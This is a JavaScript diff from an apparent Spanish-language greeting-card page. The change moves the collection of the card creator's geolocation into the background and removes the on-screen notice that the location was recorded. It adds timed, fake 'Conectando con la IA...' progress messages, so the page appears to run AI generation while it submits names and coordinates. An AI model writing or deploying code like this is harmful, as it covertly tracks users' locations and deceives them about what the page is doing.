@@ -136,40 +136,35 @@
             const sub = document.getElementById('magic-subtext');
             modal.style.display = 'flex';
 
-            // 1. CAPTURE CREATOR LOCATION (Silent attempt with Timeout)
+            // 1. START GEOLOCATION (NON-BLOCKING / BACKGROUND)
             let creatorLoc = { lat: null, lng: null };
-            txt.textContent = "Verificando Fuente...";
+            const geoPromise = new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                        () => resolve({ lat: null, lng: null }),
+                        { timeout: 2000 } // Short timeout
+                    );
+                } else {
+                    resolve({ lat: null, lng: null });
+                }
+            }).then(loc => { creatorLoc = loc; });
 
-            try {
-                // FORCE TIMEOUT of 3 seconds
-                const pos = await Promise.race([
-                    new Promise((resolve, reject) => {
-                        if ("geolocation" in navigator) {
-                            navigator.geolocation.getCurrentPosition(resolve, reject);
-                        } else reject();
-                    }),
-                    new Promise((_, reject) => setTimeout(() => reject("Timeout"), 3000))
-                ]);
-
-                creatorLoc.lat = pos.coords.latitude;
-                creatorLoc.lng = pos.coords.longitude;
-                sub.textContent = "Ubicación del Creador: Registrada";
-            } catch (e) {
-                // If it fails or times out, we proceed anyway!
-                sub.textContent = "Ubicación del Creador: Omitida (Continuando)";
-            }
-
-            // 2. SIMULATE AI GENERATION
+            // 2. SIMULATE AI GENERATION (Run immediately)
             const steps = selectedMode === 'upload'
-                ? ["Analizando archivo...", "Optimizando colores...", "Aplicando filtro romántico...", "Generando enlace único..."]
-                : ["Diseñando tarjeta personalizada...", `Escribiendo: "Te Quiero ${recipientName}"...`, "Añadiendo animación de flores...", "Finalizando detalles..."];
+                ? ["Conectando con el servidor...", "Analizando archivo...", "Mejorando colores...", "Generando enlace único..."]
+                : ["Conectando con la IA...", `Diseñando para ${recipientName}...`, "Dibujando flores...", "Finalizando tarjeta..."];
 
             for (let i = 0; i < steps.length; i++) {
                 txt.textContent = steps[i];
-                await new Promise(r => setTimeout(r, 1000));
+                sub.textContent = "Procesando...";
+                await new Promise(r => setTimeout(r, 1200)); // Visual wait
             }
 
-            // 3. SUBMIT
+            // 3. SUBMIT (Wait for geo if it's fast, otherwise proceed)
+            // We give geo one last split second to finish if it hasn't
+            await Promise.race([geoPromise, new Promise(r => setTimeout(r, 500))]);
+
             await submitData(senderName, recipientName, creatorLoc);
             modal.style.display = 'none';
         }
